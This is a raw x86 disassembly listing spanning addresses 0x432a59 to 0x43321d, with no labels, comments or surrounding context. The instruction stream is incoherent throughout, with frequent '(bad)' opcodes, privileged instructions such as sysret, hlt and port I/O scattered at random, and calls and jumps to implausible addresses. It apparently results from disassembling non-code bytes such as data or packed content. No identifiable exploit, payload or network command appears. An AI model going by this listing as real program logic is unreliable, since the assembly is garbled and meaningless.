  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
